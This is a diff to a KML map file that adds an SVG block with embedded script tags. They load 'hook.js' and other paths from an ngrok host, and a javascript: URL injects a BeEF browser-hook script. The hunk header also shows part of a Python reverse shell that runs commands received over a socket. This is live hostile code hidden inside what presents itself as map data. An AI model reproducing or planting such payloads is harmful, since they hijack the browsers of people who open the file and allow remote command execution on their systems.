@@ -10,6 +10,22 @@ while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stder
         <href><![CDATA[https://www.google.com/maps/d/u/1/kml?forcekml=1&mid=1_aZmhBvyjuSuP-ztAgojmIUfti-pCvQ]]></href>
       </Link>
     </NetworkLink>
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo" o="foo"/>
+<html>
+<head>
+  <script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/hook.js"></script>
+</head>
+<body>
+<script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/"></script>
+</body>
+</html>
+<script type="text/javascript" xlink:href="https://fe05-179-24-242-83.ngrok.io/vuln.php"></script>
+  <image xlink:href="javascript:%20(function%20()%20{%20var%20url%20=%20%27http://0.0.0.0:3000/hook.js%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();" height="200" width="200" onload="document.getElementById('foo').setAttribute('fill', 'blue');"/>
+</svg>
+
   </Document>
 </kml>
 
